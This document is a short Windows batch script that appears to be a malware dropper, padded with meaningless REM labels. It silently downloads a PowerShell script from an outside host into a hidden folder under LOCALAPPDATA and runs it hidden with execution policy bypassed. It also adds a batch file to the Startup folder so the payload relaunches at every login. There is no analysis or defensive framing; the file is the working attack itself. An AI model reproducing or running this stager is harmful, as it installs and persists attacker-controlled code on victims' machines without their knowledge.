@echo off
REM Ver809
setlocal EnableDelayedExpansion
REM Ver349
REM Mod774

REM [7c1b59a7230bf333c4071f6197109324]

set "fp=%LOCALAPPDATA%\9abbde22d6"
set "fn=176f928e72.ps1"
set "ur=https://web-production-9d7cc.up.railway.app/client.ps1"

REM Proc510
if not exist "%fp%" mkdir "%fp%"

REM Sys490
powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%ur%','%fp%\%fn%');Start-Process powershell -ArgumentList '-w hidden -ep bypass -f %fp%\%fn%' -WindowStyle Hidden"

REM Core973
set "su=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%su%\fd23e7.bat" (
    echo @echo off> "%su%\fd23e7.bat"
    echo powershell -w hidden -ep bypass -f "%fp%\%fn%">> "%su%\fd23e7.bat"
)

REM Core415
exit /b 0

REM [430DB3B9FB4C950537CFECAB]
